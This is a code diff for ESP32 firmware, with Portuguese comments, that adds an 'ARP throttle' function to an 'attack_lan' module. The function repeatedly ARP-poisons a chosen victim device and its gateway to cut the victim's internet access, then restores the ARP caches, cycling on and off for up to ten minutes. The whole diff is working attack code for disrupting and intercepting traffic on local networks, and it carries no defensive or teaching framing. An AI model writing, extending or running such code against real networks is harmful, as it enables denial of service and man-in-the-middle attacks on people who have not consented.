@@ -47,6 +47,20 @@ typedef struct {
 static arp_cut_ctx_t s_cut = { .stop = true };
 static TaskHandle_t s_cut_task = NULL;
 
+typedef struct {
+    uint8_t target_ip[4];
+    uint8_t target_mac[6];
+    uint8_t gateway_ip[4];
+    uint8_t gateway_mac[6];
+    uint16_t on_ms;
+    uint16_t off_ms;
+    int64_t deadline_us;
+    volatile bool stop;
+} arp_throttle_ctx_t;
+
+static arp_throttle_ctx_t s_thr = { .stop = true };
+static TaskHandle_t s_thr_task = NULL;
+
 static void wifi_event_handler(void *arg, esp_event_base_t base,
                                 int32_t id, void *data)
 {
@@ -147,9 +161,8 @@ esp_err_t attack_lan_wifi_connect(const char *ssid, const char *psk,
 
 esp_err_t attack_lan_wifi_disconnect(void)
 {
-    if (!s_cut.stop) {
-        s_cut.stop = true;
-    }
+    if (!s_cut.stop) s_cut.stop = true;
+    if (!s_thr.stop) s_thr.stop = true;
     return esp_wifi_disconnect();
 }
 
@@ -250,6 +263,113 @@ esp_err_t attack_lan_arp_cut_stop(void)
 {
     if (s_cut.stop) return ESP_ERR_INVALID_STATE;
     s_cut.stop = true;
+    return ESP_OK;
+}
+
+// ----------------------------------------------------------------------
+// ARP throttle (cycle on/off de poisoning)
+// ----------------------------------------------------------------------
+
+// Envia ARP reply "corretiva" pra restaurar o cache da vítima e do
+// gateway com os MACs verdadeiros. Usado nos ciclos OFF do throttle.
+static void send_arp_restore(arp_throttle_ctx_t *ctx)
+{
+    // Restore na vítima: gateway IP → gateway MAC (verdadeiro)
+    send_arp_reply(s_my_mac, ctx->target_mac,
+                   ctx->gateway_mac, ctx->gateway_ip,
+                   ctx->target_mac, ctx->target_ip);
+    // Restore no gateway: vítima IP → vítima MAC
+    send_arp_reply(s_my_mac, ctx->gateway_mac,
+                   ctx->target_mac, ctx->target_ip,
+                   ctx->gateway_mac, ctx->gateway_ip);
+}
+
+static void send_arp_poison(arp_throttle_ctx_t *ctx)
+{
+    send_arp_reply(s_my_mac, ctx->target_mac,
+                   s_my_mac, ctx->gateway_ip,
+                   ctx->target_mac, ctx->target_ip);
+    send_arp_reply(s_my_mac, ctx->gateway_mac,
+                   s_my_mac, ctx->target_ip,
+                   ctx->gateway_mac, ctx->gateway_ip);
+}
+
+static void arp_throttle_task(void *arg)
+{
+    (void)arg;
+    uint32_t cycle = 0;
+    while (!s_thr.stop && esp_timer_get_time() < s_thr.deadline_us) {
+        // Fase ON: vítima sem internet
+        int64_t on_until = esp_timer_get_time() + (int64_t)s_thr.on_ms * 1000;
+        while (!s_thr.stop && esp_timer_get_time() < on_until &&
+               esp_timer_get_time() < s_thr.deadline_us) {
+            send_arp_poison(&s_thr);
+            vTaskDelay(pdMS_TO_TICKS(1000)); // refresh interno do poison
+        }
+        if (s_thr.stop) break;
+
+        // Fase OFF: restaura ARP correto
+        send_arp_restore(&s_thr);
+        int64_t off_until = esp_timer_get_time() + (int64_t)s_thr.off_ms * 1000;
+        while (!s_thr.stop && esp_timer_get_time() < off_until &&
+               esp_timer_get_time() < s_thr.deadline_us) {
+            vTaskDelay(pdMS_TO_TICKS(500));
+        }
+        cycle++;
+        ESP_LOGI(TAG, "arp_throttle cycle %lu (on=%ums off=%ums)",
+                 (unsigned long)cycle,
+                 (unsigned)s_thr.on_ms, (unsigned)s_thr.off_ms);
+    }
+
+    // Cleanup: restaura o cache antes de sair
+    send_arp_restore(&s_thr);
+    ESP_LOGI(TAG, "arp_throttle ended after %lu cycles", (unsigned long)cycle);
+    s_thr.stop = true;
+    s_thr_task = NULL;
+    vTaskDelete(NULL);
+}
+
+esp_err_t attack_lan_arp_throttle_start(const uint8_t target_ip[4],
+                                        const uint8_t target_mac[6],
+                                        const uint8_t gateway_ip[4],
+                                        const uint8_t gateway_mac[6],
+                                        uint16_t on_ms,
+                                        uint16_t off_ms,
+                                        uint16_t duration_sec)
+{
+    if (!s_connected) return ESP_ERR_INVALID_STATE;
+    if (!s_cut.stop)  return ESP_ERR_INVALID_STATE; // cut em andamento
+    if (!s_thr.stop)  return ESP_ERR_INVALID_STATE; // throttle em andamento
+    if (on_ms < 200)   on_ms = 200;
+    if (on_ms > 60000) on_ms = 60000;
+    if (off_ms < 200)  off_ms = 200;
+    if (off_ms > 60000) off_ms = 60000;
+    if (duration_sec == 0 || duration_sec > 600) duration_sec = 60;
+
+    memcpy(s_thr.target_ip,   target_ip,   4);
+    memcpy(s_thr.target_mac,  target_mac,  6);
+    memcpy(s_thr.gateway_ip,  gateway_ip,  4);
+    memcpy(s_thr.gateway_mac, gateway_mac, 6);
+    s_thr.on_ms = on_ms;
+    s_thr.off_ms = off_ms;
+    s_thr.deadline_us = esp_timer_get_time() + (int64_t)duration_sec * 1000000LL;
+    s_thr.stop = false;
+
+    if (xTaskCreate(arp_throttle_task, "arp_thr", 4096, NULL, 5, &s_thr_task) != pdPASS) {
+        s_thr.stop = true;
+        return ESP_ERR_NO_MEM;
+    }
+
+    ESP_LOGI(TAG, "arp_throttle started: target=%u.%u.%u.%u on=%ums off=%ums for %us",
+             target_ip[0], target_ip[1], target_ip[2], target_ip[3],
+             (unsigned)on_ms, (unsigned)off_ms, (unsigned)duration_sec);
+    return ESP_OK;
+}
+
+esp_err_t attack_lan_arp_throttle_stop(void)
+{
+    if (s_thr.stop) return ESP_ERR_INVALID_STATE;
+    s_thr.stop = true;
     return ESP_OK;
 }
 
